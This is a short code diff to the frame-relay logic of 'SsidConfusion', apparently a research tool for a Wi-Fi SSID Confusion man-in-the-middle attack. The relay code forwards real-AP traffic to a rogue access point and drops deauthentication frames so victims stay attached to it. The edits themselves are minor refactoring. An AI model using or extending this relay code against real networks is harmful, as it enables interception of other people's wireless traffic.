@@ -68,7 +68,7 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
 	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
-	SOLVE_OR_CONTINUE(handle_eapol_real(addr1, addr2, *pdu))
+	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
 	SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))
 
 	#undef SOLVE_OR_CONTINUE
@@ -77,17 +77,17 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		return; // don't relay real AP beacons
 	}
 
-	// Don't relay real AP auth/assoc responses — client already got our local replies
+	// don't relay real AP auth/assoc responses - client already got our local replies
 	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()
 	   || dot11->find_pdu<Dot11Authentication>()) return;
 
-	// Don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
+	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
 	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) return;
 
 	if(addr1 == sta.get(SK::mac) || addr2 == ap.get(SK::mac)) {
-		// This is traffic involving the real AP
+		// implicitly forward rest of frames
 		display_traffic(*pdu, "Real channel", " -- MitM'ing");
-		send_to_rogue(*pdu);
+		send_to_rogue(raw);
 	}
 }
 
